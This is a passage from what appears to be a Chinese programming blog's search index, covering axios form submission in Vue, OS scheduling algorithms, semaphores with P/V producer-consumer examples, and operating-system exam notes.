“application&#x2F;x-www-form-urlencoded;charset&#x3D;UTF-8” ​ }, 但个人实验了一下没有解决问题， 之后又试了下js函数把字符转换，没有解决问题。 方法：使用vue axios推荐的vue-axios的使用及其get与post网络请求 即： get请求时用如下方式代替字符拼接方式 &#x2F;&#x2F; Optionally the request above could also be done as axios.get(&#39;&#x2F;user&#39;, &#123; params: &#123; ID: 12345 &#125; &#125;) .then(function (response) &#123; console.log(response); &#125;) .catch(function (error) &#123; console.log(error); &#125;); post请求时一样： axios.post(&#39;&#x2F;user&#39;, &#123; firstName: &#39;Fred&#39;, lastName: &#39;Flintstone&#39; &#125;) .then(function (response) &#123; console.log(response); &#125;) .catch(function (error) &#123; console.log(error); &#125;); 所以项目中最终采取的代码： let data &#x3D; new FormData(); data.append(&quot;name&quot;, this.signform.signname); data.append(&quot;username&quot;, this.signform.signusername); data.append(&quot;password&quot;, this.signform.signpassword); data.append(&quot;user_type&quot;, this.sign_user_type); data.append(&quot;email&quot;, this.signform.mailAddress); data.append(&quot;studentid&quot;, this.signform.studentid); console.log(data); var that &#x3D; this; axios .post(this.$api + &quot;&#x2F;Register&#x2F;&quot;, data) &#x2F;&#x2F;以slash结尾 .then(function (response) &#123; console.log(response.data); &#125;) .catch((err) &#x3D;&gt; &#123;&#125;); 注意的时此时后台时没有显示字段的，但是数据库里已经加入了（注册功能哈）。"},{"title":"操作系统之调度","path":"/post/4be5.html","text":"调度调度的基本概念调度研究的问题：当有一堆任务要处理，但由于资源有限，这些事情没法同时处理。这就需要确定某种规则来决定处理这些任务的顺序，这就是调度研究的问题。 举个有味道的例子：现在有4个人要上厕所(他们几乎同时到达)，他们分别需要使用厕所3分钟、10分钟、1分钟、4分钟。但是他们面前只有一个厕所，而且厕所里面只有一个马桶，那我们应该怎么确定他们上厕所的顺序呢？*我们有以下的方案：**1. 谁先来，谁就先用厕所。\\2. 谁需要使用的时间少，谁先用厕所。***我们先说说第一种方案，这种方案很公平，谁先来谁先用，但是这样会产生一个问题。假如他们来的顺序是10分钟、4分钟、3分钟、1分钟，显然，采用这种方案的话，对于最后一个人，他上厕所1分钟要等17分钟，估计翔都憋不住了吧…我们再说下第二种方案，采用这种方案的话，虽然没有第一种方案公平，但是这4个人的整体平均等待时间是最少的。(平均等待时间 &#x3D; 每个人等待的时间的和 &#x2F; 人数)**** 在上面的例子中，厕所就是资源，方案就是调度的规则，而调度就是安排他们上厕所。 我们回到操作系统，在多道程序系统中，进程的数量往往是多于处理机个数的，这样就导致处理机不能并行的处理所有进程。处理机调度，就是从就绪队列中按照某种的算法选择一个进程并将处理机分配给它，以实现进程的并发运行。 操作系统的调度有三个层次，分别是高级调度、中级调度和低级调度。下面分别介绍它们。 高级调度 (外存 –&gt; 内存)我们知道是计算机的内存空间是有限，所以有时操作系统无法将用户提交的作业全部放入内存 (在单道批系统时)，因此操作系统就需要确定某种算法，决定作业调度内存的顺序。高级调度，就是按某种算法在外存中处于后备队列的作业中挑选一个(或多个)作业，给它分配内存等必要资源，并建立相应的进程(建立PCB)，以使它(们)获得竞争处理机的权利。高级调度是外存与内存之间的调度。在这里，每个作业只调入一次，调出一次。作业调入时会建立相应的PCB，作业调出时才撤销PCB。高级调度主要是指调入的问题，因为只有调入的时机需要操作系统来确定，而调出的时机必然是作业运行结束后。这种调度就好像刚刚的上厕所问题，厕所外的人处于后备队列，而高级调度的任务就类似把人从厕所外调入到厕所内。 中级调度 (外存 –&gt; 内存)背景：在引入了虚拟存储技术之后，操作系统可将暂时不能运行的进程调至外存等待。等它重新具备了运行条件且内存稍有空闲时，操作系统再把它调回内存。回顾一下，我们之前说过进程有几种状态，如 就绪态、阻塞态、运行态…，那被调到外存等待的进程处于什么状态呢？这些进程会处于挂起态。值得注意的，该进程的数据段和代码段会被调回外存，但PCB依旧会留在内存中的，并不会被调回外存，因为操作系统只有通过该进程的PCB，才能对其进行管理。被挂起进程的PCB会被操作系统放到挂起队列中。 中级调度，就是决定将哪个挂起状态的进程从外存重新调回内存。注意和高级调度区分，虽然同样是从外存调到内存，但高级调度是调入，中级调度是调回。由于一个进程可能会被多次调出、调回内存，因此中级调度发生的频率要比高级调度的高。 补充：进程的挂起态与七状态模型暂时调到外存等待的进程状态为挂起态。挂起态其实又可以进一步细分为就绪挂起、阻塞挂起两种状态，于是，五状态模型现在变成了七状态模型。 注意： 注意”挂起态”和”阻塞态”的区别，两种状态都是暂时不能获得CPU的服务，但挂起态是将进程实体(除PCB外)调到外存，而阻塞态的进程实体还留存在内存中。 有的操作系统不只把挂起态分为阻塞挂起和就绪挂起，甚至会根据阻塞原因的不同把阻塞挂起态的进程进一步细分为多个队列。 低级调度 (内存 –&gt; CPU)低级调度的主要任务是按照某种规则从就绪队列中选取一个进程，将CPU分配给它。低级调度是操作系统中最基本的一种调度，在一般的操作系统中都必须配置低级调度。而且低级调度的频率很高，一般几十毫秒一次。 又是一个有味道的例子故事背景：现在有很多个人想上厕所，他们面前有一间厕所，厕所里面有三个马桶。 接下来，我们把厕所看作是内存，马桶看作是CPU，现在我们来看看这三种调度与这例子的类比。 高级调度：研究怎么让还没进入过厕所的人进入厕所。(厕所外 –&gt; 厕所内，之前一直在厕所外) 中级调度：有的人进入了厕所，但是尿不出来，于是他们被赶了出去。中级调度就是研究怎么让这些被赶出去的人再次回到厕所。 (厕所外 –&gt; 厕所内，之前进入过厕所) 低级调度：研究怎么给厕所内的人分配马桶。(厕所内 –&gt; 马桶上) 总结 调度的算法先来先服务调度算法（FCFS）最简单的一个调度算法，就是非抢占式的先来先服务（*First Come First Severd, FCFS*）算法了。 顾名思义，先来后到，每次从就绪队列选择最先进入队列的进程，然后一直运行，直到进程退出或被阻塞，才会继续从队列中选择第一个进程接着运行。 这似乎很公平，但是当一个长作业先运行了，那么后面的短作业等待的时间就会很长，不利于短作业。 FCFS 对长作业有利，适用于 CPU 繁忙型作业的系统，而不适用于 I&#x2F;O 繁忙型作业的系统。 最短作业优先调度算法（SJF）最短作业优先（*Shortest Job First, SJF*）调度算法同样也是顾名思义，它会优先选择运行时间最短的进程来运行，这有助于提高系统的吞吐量。 这显然对长作业不利，很容易造成一种极端现象。 比如，一个长作业在就绪队列等待运行，而这个就绪队列有非常多的短作业，那么就会使得长作业不断的往后推，周转时间变长，致使长作业长期不会被运行。 高响应比优先调度算法（HRRN）前面的「先来先服务调度算法」和「最短作业优先调度算法」都没有很好的权衡短作业和长作业。 那么，高响应比优先 （*Highest Response Ratio Next, HRRN*）调度算法主要是权衡了短作业和长作业。 每次进行进程调度时，先计算「响应比优先级」，然后把「响应比优先级」最高的进程投入运行，「响应比优先级」的计算公式： 时间片轮转调度算法（RR）最古老、最简单、最公平且使用最广的算法就是时间片轮转（*Round Robin, RR*）调度算法。 每个进程被分配一个时间段，称为时间片（*Quantum*），即允许该进程在该时间段中运行。 如果时间片用完，进程还在运行，那么将会把此进程从 CPU 释放出来，并把 CPU 分配另外一个进程； 如果该进程在时间片结束前阻塞或结束，则 CPU 立即进行切换； 另外，时间片的长度就是一个很关键的点： 如果时间片设得太短会导致过多的进程上下文切换，降低了 CPU 效率； 如果设得太长又可能引起对短作业进程的响应时间变长。将 通常时间片设为 20ms~50ms 通常是一个比较合理的折中值。 多级反馈队列调度算法多级反馈队列（*Multilevel Feedback Queue*）调度算法是「时间片轮转算法」和「最高优先级算法」的综合和发展。 顾名思义： 「多级」表示有多个队列，每个队列优先级从高到低，同时优先级越高时间片越短。 「反馈」表示如果有新的进程加入优先级高的队列时，立刻停止当前正在运行的进程，转而去运行优先级高的队列； 来看看，它是如何工作的： 设置了多个队列，赋予每个队列不同的优先级，每个队列优先级从高到低，同时优先级越高时间片越短； 新的进程会被放入到第一级队列的末尾，按先来先服务的原则排队等待被调度，如果在第一级队列规定的时间片没运行完成，则将其转入到第二级队列的末尾，以此类推，直至完成； 当较高优先级的队列为空，才调度较低优先级的队列中的进程运行。如果进程运行时，有新进程进入较高优先级的队列，则停止当前运行的进程并将其移入到原队列末尾，接着让较高优先级的进程运行； 可以发现，对于短作业可能可以在第一级队列很快被处理完。对于长作业，如果在第一级队列处理不完，可以移入下次队列等待被执行，虽然等待的时间变长了，但是运行时间也会更长了，所以该算法很好的兼顾了长短作业，同时有较好的响应时间。 几种调度算法的比较： 参考文章： CPU调度算法总结 大厂面试爱问的「调度算法」，20 张图一举拿下"},{"title":"操作系统之信号量、P、V操作","path":"/post/c299.html","text":"信号量是最早出现的用来解决进程同步与互斥问题的机制(也可实现进程通信)，包括一个称为信 号量的变量及对它进行的两个原语操作。信号量为一个整数，我们设这个信号量为：sem。很显然，我们规定在sem大于等于零的时候代表可供并发进程使用的 资源实体数，sem小于零的时候，表示正在等待使用临界区的进程的个数。根据这个原则，在给信号量附初值的时候，我们显然就要设初值大于零。 p操作和v操作是不可中断的程序段，称为原语。P,V原语中P是荷兰语的Passeren，相当于英文的pass, V是荷兰语的Verhoog,相当于英文中的incremnet。 且在P,V愿语执行期间不允许有中断的发生。 对于具体的实现，方法非常多，可以用硬件实现，也可以用软件实现。这种信号量机制必须有公共内存，不能用于分布式操作系统，这是它最大的弱点。 首先应弄清PV操作的含义：PV操作由P操作原语和V操作原语组成（原语是不可中断的过程），对信号量进行操作，具体定义如下： ​ P（S）：①将信号量S的值减1，即S&#x3D;S-1； ​ ②如果S&gt;&#x3D;0，则该进程继续执行；否则该进程置为等待状态，排入等待队列。 ​ V（S）：①将信号量S的值加1，即S&#x3D;S+1； ​ ②如果S&gt;0，则该进程继续执行；否则释放队列中第一个等待信号量的进程。 PV操作的意义：我们用信号量及PV操作来实现进程的同步和互斥。PV操作属于进程的低级通信。 什么是信号量？信号量（semaphore）的数据结构为一个值和一个指针，指针指向等待该 信号量的下一个进程。信号量的值与相应资源的使用情况有关。当它的值大于0时，表示当前可用资源的数量；当它的值小于0时，其绝对值表示等待使用该资源的 进程个数。注意，信号量的值仅能由PV操作来改变。 一般来说，信号量S&gt;&#x3D;0时，S表示可用资源的数量。执行一次P操作意味着请求分配一个单位资源，因此S的值减1； 当S&lt;0时，表示已经没有可用资源，请求者必须等待别的进程释放该类资源，它才能运行下去。而执行一个V操作意味着释放一个单位资源，因此S的值加1； 若S&lt;&#x3D;0，表示有某些进程正在等待该资源，因此要唤醒一个等待状态的进程，使之运行下去 利用信号量和PV操作实现进程互斥的一般模型是：进程P1 进程P2 …… 进程Pn …… …… …… P（S）； P（S）； P（S）； 临界区； 临界区； 临界区； V（S）； V（S）； V（S）； …… …… …… …… 其中信号量S用于互斥，初值为1 使用PV操作实现进程互斥时应该注意的是： （1）每个程序中用户实现互斥的P、V操作必须成对出现，先做P操作，进临界区，后做V操作，出临界区。若有多个分支，要认真检查其成对性。 （2）P、V操作应分别紧靠临界区的头尾部，临界区的代码应尽可能短，不能有死循环。 （3）互斥信号量的初值一般为1。 利用信号量和PV操作实现进程同步PV操作是典型的同步机制之一。用一个信号量与一个消息联系起来，当信号量的值为0时，表示期望的消息尚未产生；当信号量的值非0时，表示期望的消息已经存在。用PV操作实现进程同步时，调用P操作测试消息是否到达，调用V操作发送消息。 利用信号量和PV操作实现进程互斥的一般模型是： 进程A 进程B …. …. L: P(信号量) L2:V(信号量） …. …. 使用PV操作实现进程同步时应该注意的是： （1）分析进程间的制约关系，确定信号量种类。在保持进程间有正确的同步关系情况下，哪个进程先执行，哪些进程后执行，彼此间通过什么资源（信号量）进行协调，从而明确要设置哪些信号量。 （2）信号量的初值与相应资源的数量有关，也与P、V操作在程序代码中出现的位置有关。 （3）同一信号量的P、V操作要成对出现，但它们分别在不同的进程代码中。 【例1】生产者-消费者问题 在多道程序环境下，进程同步是一个十分重要又令人感兴趣的问题，而生产者-消费者问题是其中一个有代表性的进程同步问题。下面我们给出了各种情况下的生产者-消费者问题，深入地分析和透彻地理解这个例子，对于全面解决操作系统内的同步、互斥问题将有很大帮助。 （1）一个生产者，一个消费者，公用一个缓冲区。 定义两个同步信号量： empty——表示缓冲区是否为空，初值为1。 full——表示缓冲区中是否为满，初值为0。 生产者进程 while(TRUE)&#123; 生产一个产品; P(empty); 产品送往Buffer; V(full); &#125; 消费者进程 while(TRUE)&#123; P(full); 从Buffer取出一个产品; V(empty); 消费该产品; &#125; （2）一个生产者，一个消费者，公用n个环形缓冲区。 定义两个同步信号量： empty——表示缓冲区是否为空，初值为n。 full——表示缓冲区中是否为满，初值为0。 ​ 设缓冲区的编号为1～n&amp;61485;1，定义两个指针in和out，分别是生产者进程和消费者进程使用的指针，指向下一个可用的缓冲区。 生产者进程 while(TRUE)&#123; 生产一个产品; P(empty); 产品送往buffer(in); in&#x3D;(in+1)mod n; V(full); &#125; 消费者进程 while(TRUE)&#123; P(full); 从buffer(out)中取出产品; out&#x3D;(out+1)mod n; V(empty); 消费该产品; &#125; （3）一组生产者，一组消费者，公用n个环形缓冲区 ​ 在这个问题中，不仅生产者与消费者之间要同步，而且各个生产者之间、各个消费者之间还必须互斥地访问缓冲区。 定义四个信号量： empty——表示缓冲区是否为空，初值为n。 full——表示缓冲区中是否为满，初值为0。 mutex1——生产者之间的互斥信号量，初值为1。 mutex2——消费者之间的互斥信号量，初值为1。 ​ 设缓冲区的编号为1～n&amp;61485;1，定义两个指针in和out，分别是生产者进程和消费者进程使用的指针，指向下一个可用的缓冲区。 生产者进程 while(TRUE)&#123; 生产一个产品; P(empty); P(mutex1); 产品送往buffer(in); in&#x3D;(in+1)mod n; V(mutex1); V(full); &#125; 消费者进程 while(TRUE)&#123; P(full); P(mutex2); 从buffer(out)中取出产品; out&#x3D;(out+1)mod n; V(mutex2); V(empty); 消费该产品; &#125; 需要注意的是无论在生产者进程中还是在消费者进程中，两个P操作的次序不能颠倒。应先执行同步信号量的P操作，然后再执行互斥信号量的P操作，否则可能造成进程死锁。 【例2】桌上有一空盘，允许存放一只水果。爸爸可向盘中放苹果，也可向盘中放桔子，儿子专等吃盘中的桔子，女儿专等吃盘中的苹果。规定当盘空时一次只能放一只水果供吃者取用，请用P、V原语实现爸爸、儿子、女儿三个并发进程的同步。 分析 在本题中，爸爸、儿子、女儿共用一个盘子，盘中一次只能放一个水果。当盘子为空时，爸爸可将一个水果放入果盘中。若放入果盘中的是桔子，则允许儿子吃，女 儿必须等待；若放入果盘中的是苹果，则允许女儿吃，儿子必须等待。本题实际上是生产者-消费者问题的一种变形。这里，生产者放入缓冲区的产品有两类，消费 者也有两类，每类消费者只消费其中固定的一类产品。 ​ 解：在本题中，应设置三个信号量S、So、Sa，信号量S表示盘子是否为空，其初值为l；信号量So表示盘中是否有桔子，其初值为0；信号量Sa表示盘中是否有苹果，其初值为0。同步描述如下： int S＝1; int Sa＝0; int So＝0; main() &#123; cobegin father(); &#x2F;*父亲进程*&#x2F; son(); &#x2F;*儿子进程*&#x2F; daughter(); &#x2F;*女儿进程*&#x2F; coend &#125; father() &#123; while(1) &#123; P(S); 将水果放入盘中; if（放入的是桔子） V(So); else V(Sa); &#125; &#125; son() &#123; while(1) &#123; P(So); 从盘中取出桔子; V(S); 吃桔子; &#125; &#125; daughter() &#123; while(1) &#123; P(Sa); 从盘中取出苹果; V(S); 吃苹果; &#125; &#125; 例题3设公交车上,司机和售票员的活动如下：司机;启动车辆;正常行使,到站停车. 售票员;关车门,售票 开车门. 在汽车不断到站 停车 行驶过程中这两个活动有什么同步关系? 用信号量和pv操作实现。 设信号量为s1(是否开车)和s2(是否停车),s1&#x3D;1,s2&#x3D;0; 司机进程： 售票员进程： begin begin L1: L2: P(S1); 关闭车门； 启动车辆； V(s1); 正常行驶； 售票； V(s2）； P(s2); goto L1; 开车门； end； goto L2; end； 思考题：四个进程A、B、C、D都要读一个共享文件F，系统允许多个进程同时读文件F。但限制是进程A和进程C不能同时读文件F，进程B和进程D也不能同时读文件F。为了使这四个进程并发执行时能按系统要求使用文件，现用PV操作进行管理，请回答下面的问题： （1）应定义的信号量及初值： 。 （2）在下列的程序中填上适当的P、V操作，以保证它们能正确并发工作： A() B() C() D() { { { { [1]; [3]; [5]; [7]; read F; read F; read F; read F; [2]; [4]; [6]; [8]; } } } } 思考题解答：（1）定义二个信号量S1、S2，初值均为1，即：S1&#x3D;1，S2&#x3D;1。其中进程A和C使用信号量S1，进程B和D使用信号量S2。 （2）从[1]到[8]分别为：P(S1) V(S1) P(S2) V(S2) P(S1) V(S1) P(S2) V(S2) 信号量、PV操作是解决进程间的同步与互斥问题的。 ★ 做题时尤其要注意隐藏的同步、互斥问题。这些问题通常可以归入生产者－消费者问题和阅读者－写入者问题。 ★ PV操作一定是成对出现的，但是这不意味着它会在一个进程内成对出现。 ★ 在互斥关系中，PV操作一定是在一个进程内成对出现。而且，信号一定大于0,具体多少视情况而定。而对于同步关系，则一对PV操作在两个进程或者更多的进程中出现。 ★ 对于同步关系，信号量可能为0，也可能不为0；用于同步的信号个数可能1个，也可能是多个。 ★ 对信号量为1的，应该先执行V操作。 ★ 在生产者－消费者问题中，要设置三个信号量：empty－空闲的缓存区数量，初值为n；full－已填充的缓存区数量，初值为0；mutex－保证只有一个进程在写入缓存区，初值为1。 ★ 在阅读者－写入者问题中，设置两个信号量：信号量access－控制写入互斥，初值为1；信号量rc－控制对共享变量ReadCount（读者统计值）的互斥访问。转自：http://hongti88.blog.163.com/blog/static/38276487200882733818688/"},{"title":"操作系统习题知识点","path":"/post/116.html","text":"知识点：第一章：操作系统引论操作系统有硬件和软件组成，硬件是CPUC软件建立与活动的基础，而软件是对硬件功能的扩充。硬件包括CPU、内存、I&#x2F;O设备和总线等，软件通常分为应用软件、支撑软件和系统软件。 冯洛伊曼体系：存储器、运算器、控制器、输入设备、输出设备。 操作系统的基本功能：管理系统内各种资源方便用户使用。 操作系统五大功能：存储管理（内存分配、地址映射、内存保护、内存扩充）， 作业和进程管理（作业和进程调度、进程控制、进程通信）， 设备管理（缓冲区管理、设备分配、设备驱动、设备无关性）， 文件管理（文件存储空间管理、文件的一般管理、目录管理、文件读写管理和存取控制）， 用户接口服务（程序接口、图形接口、命令行接口）。 操作系统定义：管理和控制计算机系统内的各种硬件软件资源、有效地组织多道程序正常运行的系统软件（或程序组合），是用户和计算机之间的接口。 操作系统发展的动力：硬件技术的更新、应用需求的扩大。 操作系统基本种类：批处理系统、分时操作系统、实时操作系统、网络系统和分布式操作系统。 操作系统基本特征：并发、共享和不确定性。 操作系统结构：整体结构、层次结构、虚拟机结构和客户-服务器结构。 系统初启的引导过程：硬件检测、加载引导程序、初始化内核、用户登录。 脱机I&#x2F;O：输入&#x2F;输出工作不受主机直接控制，而由卫星机专门负责完成I&#x2F;O，主机专门完成快速计算任务，从而二者可以并行操作。 联机I&#x2F;O：指作业的输入、调入内存及结果输出都在CPU直接控制下进行。 硬件 是指计算机物理装置本身，它是计算机系统的物理基础。如CPU、内存、设备等。 软件是相对硬件而言的，它是与数据处理系统的操作有关的计算机程序、过程、规则及相关文档资料的总称。简单地说，软件是计算机执行的程序 单道程序设计每次主机内存中仅存放一道作业,每当它运行期间发出输入输出请求后，高速的CPU便处于等待低速的I&#x2F;O完成状态。(基本特征: 顺序性) 多道程序设计在这种设计技术下，内存中能同时存放多道程序，在管理程序的控制下交替地执行。这些作业共享CPU和系统中的其他资源。 并发是指两个或多个活动在同一给定的时间间隔中进行。它是宏观上的概念。 吞吐量 在一段给定的时间内，计算机所能完成的总工作量。 分时就是对时间的共享。在分时系统中，分时主要是指若干并发程序对CPU时间的共享。 实时 表示“及时”或“即时”。 系统调用是用户在程序中能以“函数调用”形式调用的、由操作系统提供的子功能的集合。每一个子功能称做一条系统调用命令。它是操作系统对外的接口，是用户级程序取得操作系统服务的唯一途径。 操作系统为用户提供的服务包括：命令和数据输入&#x2F;输出的管理，内存的分配，用户文件的管理，CPU的分配，设备管理等。 核心态和用户态当执行操作系统程序时，处理机处于核心态。它有较高的特权，可以执行所有的指令，包括一般用户程序中不能使用的特权指令，从而能对所有寄存器和内存进行访问、启动I&#x2F;O操作等。 用户程序是在用户态下执行，它的权限较低，只能执行指令集中非特权指令。 设置这两种不同状态的目的是为了保护操作系统程序（特别是其内核部分），防止受到用户程序的损害。 设计实时操作系统必须首先考虑实时系统的一个重要特征就是对时间的严格限制和要求。实时系统的首要任务是调度一切可利用的资源完成实时控制任务，其次才着眼于提高计算机系统的使用效率。所以，设计实时操作系统必须首先考虑处理各种事件的时间限制。 特权指令和系统调用特权指令是一类只能在核心态下执行的机器指令。而系统调用不是机器指令，它往往以函数调用的形式出现，实现操作系统提供的子功能，它是操作系统与用户的编程接口。在用户程序中可以使用系统调用来获得操作系统服务。 在系统调用代码中可以使用特权指令。 采用层次结构的好处①结构关系清晰，提高系统的可靠性和安全性。 ②各层模块的功能明确，提高系统的可扩充性和可移植性。 ③各层间具有单向依赖性，增强系统的可维护性。 ④符合软件工程的思想，便于实施研制开发。 微内核模式设计系统的优点①精减核心的功能，提供了一种简单的高度模块化的体系结构，提高了系统设计及使用的灵活性。 ②可移植性好。所有与具体机器特征相关的代码，全部隔离在微内核中。 ③可伸缩性好。操作系统能方便地进行定制、扩充或缩减，以适应硬件的快速更新和应用需求的不断变化。 ④实时性好。微内核可以方便地支持实时处理。 ⑤提供多线程机制，支持多处理器的体系结构和分布式系统及计算机网络。 ⑥系统安全性好。传统的操作系统将安全性功能建立在内核之外，因而它并不是很安全的。而微内核则将安全性作为系统内特性来进行设计。 中断与硬件相关，外部设备通过发送中断信号通知CPU抽空处理设备请求。 原语处于操作系统的最底层，是最接近硬件的部分。具有原子性一其操作只能一气呵成。 RAM:随机访问存储器( random-access memory的缩写)特征:可随机读写，读写速度快，断电后数据消失。 ROM:只读存储器(read only memory)特征:数据写入之后不可更改，即使断电数据也不消失。 EPROM:电可编程序只读存储器(Electrically Programmable Read- Only- Memory)，-种特殊的ROM。 BIOS: Basic Input Output System 基本输入输出系统 实时操作系统是指当外界事件或数据产生时，能够接受并以足够快的速度予以处理，其处理的结果又能在规定的时间之内来控制生产过程或对处理系统做出快速响应，并控制所有实时任务协调一致运行的操作系统。 响应比响应比&#x3D; (等待的时间+要求服务的时间) &#x2F;要求服务的时间 eg:进程A要求服务5秒，进程B要求服务10秒，且进程B更重要。若两进程同时到达，则等待10秒之后:进程A响应比&#x3D;3，进程B响应比&#x3D;2。处理顺序: 进程A-&gt;进程B 系统调用 VS 库函数 第二章：进程和线程当进程顺序执行时，具有封闭性和可再现性。为提高计算机的运行速度和增强系统的处理能力，广泛采用了多道程序设计技术。该技术可以实现程序的并发执行和资源的共享。但是程序与计算活动失去了一一对应，而且程序并发执行时产生相互制约的关系。为了更好地描述程序的并发过程，引入了“进程”概念。 进程可表述为：程序在并发环境中的执行状态。 进程最基本的特征：动态性和并发性。 进程状态间转化：进程的三态模型： 按进程在执行过程中的不同情况至少要定义三种状态： 运行（running）态：进程占有处理器正在运行的状态。 进程已获得CPU，其程序正在执行。在单处理机系统中，只有一个进程处于执行状态； 在多处理机系统中，则有多个进程处于执行状态。 就绪（ready）态：进程具备运行条件，等待系统分配处理器以便运行的状态。 当进程已分配到除CPU以外的所有必要资源后，只要再获得CPU，便可立即执行，进程这时的状态称为就绪状态。在一个系统中处于就绪状态的进程可能有多个，通常将它们排成一个队列，称为就绪队列。 等待（wait）态：又称阻塞态或睡眠态，指进程不具备运行条件，正在等待某个时间完成的状态。 也称为等待或睡眠状态，一个进程正在等待某一事件发生（例如请求I&#x2F;O而等待I&#x2F;O完成等）而暂时停止运行，这时即使把处理机分配给进程也无法运行，故称该进程处于阻塞状态。 引起进程状态转换的具体原因如下： 运行态→等待态：等待使用资源；如等待外设传输；等待人工干预。 等待态→就绪态：资源得到满足；如外设传输结束；人工干预完成。 运行态→就绪态：运行时间片到；出现有更高优先权进程。 就绪态—→运行态：CPU 空闲时选择一个就绪进程。 进程的五态模型： 五态模型在三态模型的基础上增加了新建态（new）和终止态（exit）。 新建态：对应于进程被创建时的状态，尚未进入就绪队列。 创建一个进程需要通过两个步骤： 1.为新进程分配所需要资源和建立必要的管理信息。 2.设置该进程为就绪态，并等待被调度执行。 终止态：指进程完成任务到达正常结束点，或出现无法克服的错误而异常终止，或被操作系统及有终止权的进程所终止时所处的状态。 处于终止态的进程不再被调度执行，下一步将被系统撤销，最终从系统中消失。 终止一个进程需要两个步骤： 1.先等待操作系统或相关的进程进行善后处理（如抽取信息）。 2.然后回收占用的资源并被系统删除。 引起进程状态转换的具体原因如下： NULL→新建态：执行一个程序，创建一个子进程。 新建态→就绪态：当操作系统完成了进程创建的必要操作，并且当前系统的性能和虚拟内存的容量均允许。 运行态→终止态：当一个进程到达了自然结束点，或是出现了无法克服的错误，或是被操作系统所终结，或是被其他有终止权的进程所终结。 运行态→就绪态：运行时间片到；出现有更高优先权进程。 运行态→等待态：等待使用资源；如等待外设传输；等待人工干预。 就绪态→终止态：未在状态转换图中显示，但某些操作系统允许父进程终结子进程。 等待态→终止态：未在状态转换图中显示，但某些操作系统允许父进程终结子进程。 终止态→NULL：完成善后操作。 PCB每个进程都有唯一的一个进程控制块（PCB），它是进程存在的唯一标识，PCB表的物理组织方式有若干种，常见的有线性表、链接表和索引表方式。线性表简单，链接表灵活，索引表处理速度快。 PCB中有表明进程状态的信息，该进程的状态包括运行态、就绪态和阻塞态，它利用状态信息来描述进程的动态性质。 PCB一般包括：进程名、特征信息、进程状态信息、调度优先权、通信信息、现场保护区等。 PCB作用：每个进程有唯一的进程控制块，操作系统根据控制块对进程实施控制和管理，进程的状态、并发特征都是通过PCB表示出来的，PCB是进程存在的唯一标识。 核心利用原语对进程实施操作，包括创建进程、阻塞进程、终止进程和唤醒进程等操作。 线程：是进程中实施调度和分配的基本单位。 进程只作为资源的分配单位和拥有者，而线程才是CPU调度的单位和占有者。 线程两种实现方式：在用户空间实现，切换速度快， 在核心空间实现，支持多线程并发。 利用组合方式可以取长补短。 进程在活动过程中会彼此发生作用，主要是同步、互斥和通信关系。同步是合作关系，互斥是竞争关系，通信是信息交流。 临界资源：一次只允许一个设备使用的资源。 临界区域（CS）：对临界资源实施操作的那段程序 利用信号量和P、V操作可以很好的解决进程间的同步和互斥问题。 详见（信号量P，V操作） 管程是功能更强的同步机制，它自动实现进程互斥进入管程。管程中可以引入条件变量，利用两个操作原语实现进程同步。 为什么引入进程概念由于多道程序并发执行时共享系统资源，共同决定这些资源的状态，因此系统中各程序在执行过程中就出现了相互制约的新关系，程序的执行出现“走走停停”的新状态。用程序这个静态概念已不能如实反映程序并发执行过程中的这些特征。为此，人们引入了“进程（Process）”这一概念来描述程序动态执行过程的性质。 进程和程序 进程与程序之间存在密切关系，进程的功能是通过程序的运行得以实现的，进程活动的主体是程序。进程不能脱离开具体程序而独自存在。 进程的互斥与同步概念同步：逻辑上相关的两个或者多个进程为完成同一个任务，通过协调活动来使用同一资源，而产生的执行时序的约束关系 互斥：逻辑上相互无关的两个或多个京城由于争用同一资源而发生的相互制约的关系 临界区进入准则：位数临界区域得到充分使用，必须严格禁止两个或多个进程同时进入，即欲进入的若干进程徐满足下列要求： 1.单个入区 2.独自占用 3.尽快退出 4.“落败让权” 进程通信—-低级进程通信 ———-互斥 ———-同步 —-高级进程通信 ———-共享存储器方式 ———-消息传递方式 —————-直接消息传递 —————-间接消息传递 ———-管道文件方式 消息传递系统原语：send 、receive 第三章：死锁死锁：指多个进程循环等待他方占有的资源而无限期的僵持下去的局面 产生的原因：根本原因：资源有限且操作不当 一种是竞争资源引起的死锁，另一种原因是进程推进顺序不当。 产生条件：互斥条件、不可抢占条件、占有且申请条件、循环等待条件 对待死锁的策略：预防、避免、检测与恢复，以及完全忽略 死锁预防基本思路：要求进程申请资源时遵循某种协议，从而打破产生死锁的四个必要条件中的一个或者几个，保证系统不会陷入死锁。 预防方法中最有效的是实施资源有序分配策略，即把资源事先编号，按序分配，所有进程对资源的请求必须资源序号递增的顺序提出，·使进程在申请、占有资源时不会形成回路。 死锁避免：是排除死锁的动态策略，关键是确定资源分配的安全性。 代表：银行家算法： 根据进程对资源的请求，试探分配后系统是否处于安全状态。若安全才分配。 死锁的检测和恢复系统有专门的机构负责，在死锁发生时，会检测死锁发生的位置和原因，且通过外力破坏死锁发生的必要条件。 资源分配图系统资源都为单体资源的情况下，若资源分配图中出现回路，则系统存在死锁。 系统资源都为多体资源的情况下，若系统存在死锁，则资源分配图一定存在回路，反之不一定。 系统选择“牺牲者”的主要依据：代价因素· 第四章：调度详见： CPU调度：CPU调度是操作系统最核心的调度，它根据算法选择合适的进程，并把CPU分配给进程使用。 每个操作系统必须的 处理机调度分为三级作业调度（高级调度） 中级调度 进程调度（低级调度） 中级调度实现进程的挂起和进程映像的转换 作业调度（高级调度）的基本功能：选择有权竞争CPU的进程，一般来说，资源分配策略（特别是内存管理）对作业调度影响很大。 作业状态：提交状态、后备状态、执行状态和完成状态 作业控制快JCB 为了管理和控制作业而引入，记录该作业的有关信息 作业调度功能： 1.记录各个作业的情况 2.按照某种算法在后备作业队列中挑选作业， 3.为选中的作业分配资源 4.为选中的作业分配进程，并把进程放到就绪队列中。 5.作业结束后的善后工作 常用算法： 先来先服务、短作业优先、最短剩余时间优先。 进程调度（低级调度）是从就绪队列中选择进程并把CPU分配给它。 功能： 保存现场、挑选进程、恢复现场 基本方式： 非抢占方式、抢占方式 常用调度算法： 轮转法、优先级法、多级队列法、短进程优先、高响应比优先等 调度准则评价调度策略的性能指标CPU利用率 Eg：某计算机只支持单道程序，某个作业刚开始需要在CPU上运行5秒，再用打印机打印输出6秒，之后再在CPU运行7秒。问：在此过程中，CPU利用率、打印机利用率分别为多少？直接给出计算结果。 吞吐量 Eg：某计算机处理完10道作业，费时100秒，请计算系统吞吐量。 周转时间周转时间&#x3D;作业完成时间点−作业提交时间点 